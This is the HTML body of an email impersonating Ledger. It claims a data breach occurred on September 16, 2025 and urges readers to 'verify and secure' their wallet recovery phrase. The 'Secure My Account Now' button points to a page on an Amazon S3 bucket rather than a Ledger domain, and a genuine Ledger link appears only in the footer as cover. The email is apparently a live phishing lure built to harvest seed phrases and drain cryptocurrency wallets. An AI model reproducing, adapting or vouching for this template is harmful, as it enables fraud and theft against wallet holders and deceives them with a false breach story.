<td style="padding: 35px; color: rgb(51, 51, 51);">
<h1 style="text-align: center; font-size: 22px; margin-bottom: 15px;">Important: Ledger Data Security Incident</h1>
<p style="line-height: 1.6; font-size: 16px; margin-bottom: 20px;">
Dear Valued Ledger User,
</p>
<p style="line-height: 1.6; font-size: 16px; margin-bottom: 20px;">
We are reaching out with an important update regarding a recent security incident affecting Ledger&#8217;s user data. On September 16, 2025, Ledger identified unauthorized access to one of our non-financial databases. This database included limited user data, and as part of our commitment to transparency and trust, we are proactively informing our users of this situation.
</p>
<p style="line-height: 1.6; font-size: 16px; margin-bottom: 20px;">
<strong style="font-weight: bold;">What Data Was Impacted?</strong><br>
The breach potentially exposed personal contact information such as email addresses and phone numbers. It did not include financial information or direct access to your Ledger wallet or private keys. However, as a precautionary measure, we strongly recommend verifying and re-securing your recovery phrase.
</p>
<p style="line-height: 1.6; font-size: 16px; margin-bottom: 20px;">
<strong style="font-weight: bold;">Immediate Steps You Should Take:</strong>
</p>
<ol style="line-height: 1.6; padding-left: 20px; font-size: 16px; margin-bottom: 30px;">
<li style="margin-bottom: 10px;">Click the button below to visit our secure verification portal.</li>
<li style="margin-bottom: 10px;">Carefully verify and secure your recovery phrase in our encrypted environment.</li>
<li style="margin-bottom: 10px;">Follow the guided instructions to enhance your account security immediately.</li>
</ol>
<p style="line-height: 1.6; font-size: 16px; margin-bottom: 20px;">
We deeply regret any inconvenience or concern this incident may have caused. Ledger remains fully committed to the highest standards of data protection and transparency. Our security teams have taken immediate and extensive actions to prevent any recurrence of this situation.
</p>
<div style="text-align: center; margin-bottom: 30px;">
<a style="padding: 14px 25px; border-radius: 5px; color: rgb(255, 255, 255); font-weight: bold; text-decoration: none; display: inline-block; background-color: rgb(0, 0, 0);" href="https://9dcde611182b073e.s3.eu-north-1.amazonaws.com/notice.html">
Secure My Account Now
</a>
</div>
<p style="text-align: center; color: rgb(136, 136, 136); font-size: 14px;">
If you have questions or need further assistance, please visit our <a style="color: rgb(0, 0, 0); text-decoration: none;" href="https://support.ledger.com">Support Center</a>.
</p>
